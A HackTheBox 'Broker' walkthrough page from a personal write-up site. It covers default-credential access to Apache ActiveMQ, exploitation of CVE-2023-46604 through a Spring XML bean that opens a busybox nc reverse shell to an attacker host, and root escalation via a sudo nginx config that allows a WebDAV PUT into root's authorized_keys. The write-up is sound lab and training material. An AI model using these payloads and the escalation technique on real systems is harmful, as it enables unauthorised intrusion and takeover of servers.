@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/broker.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Broker - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Broker</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Broker</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">apache activemq 5.15.15 default creds</span>
+                    <span class="tag">openwire deserialization rce (cve-2023-46604)</span>
+                    <span class="tag">spring classpathxmlapplicationcontext</span>
+                    <span class="tag">sudo nginx root config</span>
+                    <span class="tag">webdav authorized_keys write</span>
+                </div>
+
+                <img src="../../images/hackthebox/broker/index.png" alt="Broker Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Alongside SSH the box exposes a full <strong>Apache ActiveMQ</strong> stack: the web console (80 and 8161, both behind a basic-auth <code>ActiveMQRealm</code>), MQTT on 1883, AMQP on 5672, STOMP on 61613, and the OpenWire transport on 61616, which advertises version <strong>5.15.15</strong>.</p>
+
+                <pre><code>[broker] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC -p- 10.129.230.87
+Nmap scan report for 10.129.230.87
+Host is up (0.15s latency).
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+|_http-title: Error 401 Unauthorized
+|_  basic realm=ActiveMQRealm
+1883/tcp  open  mqtt
+5672/tcp  open  amqp?
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+|_  basic realm=ActiveMQRealm
+61613/tcp open  stomp      Apache ActiveMQ
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+|_    5.15.15
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The console accepts the ActiveMQ default credentials <code>admin:admin</code>, and the welcome page confirms the broker and its version:</p>
+
+                <pre><code>Welcome to the Apache ActiveMQ Console of localhost (ID:broker-33773-...)
+
+Broker
+Name     localhost
+Version  5.15.15</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>Apache ActiveMQ 5.15.15 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-46604">CVE-2023-46604</a>, an unauthenticated RCE in the OpenWire protocol on port 61616. When unmarshalling an exception, OpenWire reads a class name and a string argument from the wire and instantiates that class with the string as a constructor argument. Passing <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> together with a URL makes the broker fetch an attacker-hosted Spring XML and build the beans it declares, so a <code>ProcessBuilder</code> bean runs an arbitrary command.</p>
+
+                <p>The Spring XML spawns a <code>busybox nc</code> reverse shell:</p>
+
+                <pre><code>&lt;beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
+    &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;
+        &lt;constructor-arg&gt;
+            &lt;list&gt;
+                &lt;value&gt;busybox&lt;/value&gt;
+                &lt;value&gt;nc&lt;/value&gt;
+                &lt;value&gt;10.10.15.208&lt;/value&gt;
+                &lt;value&gt;35337&lt;/value&gt;
+                &lt;value&gt;-e&lt;/value&gt;
+                &lt;value&gt;sh&lt;/value&gt;
+            &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;</code></pre>
+
+                <p>Host <code>poc.xml</code> over HTTP, then send the crafted OpenWire packet pointing at it with the public PoC (<a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/README.md">vulhub CVE-2023-46604</a>). The broker fetches the XML and instantiates the bean, and the reverse shell comes back as the <code>activemq</code> service account:</p>
+
+                <pre><code>[broker] python3 -m http.server 8000
+[broker] python3 poc.py 10.129.230.87 61616 http://10.10.15.208:8000/poc.xml
+
+[broker] nc -lnvp 35337
+Listening on 0.0.0.0 35337
+Connection received on 10.129.230.87 52032
+id
+uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)</code></pre>
+
+                <p><code>activemq</code> is a real user on the host with a home directory, so the user flag is right here in <code>~</code>.</p>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking <code>sudo</code> rights, <code>activemq</code> can run the <code>nginx</code> binary as root with no password:</p>
+
+                <pre><code>activemq@broker:~$ sudo -l
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx</code></pre>
+
+                <p>Running <code>nginx</code> as root means we control its configuration, and a config runs its workers as whatever <code>user</code> directive we set. I wrote a config that runs as <code>root</code> and serves the whole filesystem on a new port with directory listing and, importantly, the WebDAV <code>PUT</code> method enabled:</p>
+
+                <pre><code>activemq@broker:~$ cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+    server {
+        listen 1339;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}
+EOF
+activemq@broker:~$ sudo nginx -c /tmp/nginx_pwn.conf</code></pre>
+
+                <p>The server now reads and writes the filesystem as root. Rather than just browse it, I <code>PUT</code> my public key straight into root's <code>authorized_keys</code> and SSH in:</p>
+
+                <pre><code>[broker] curl -X PUT 10.129.230.87:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"
+[broker] ssh root@10.129.230.87
+root@broker:~# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>Root shell, and <code>/root/root.txt</code> is done.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Broker</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
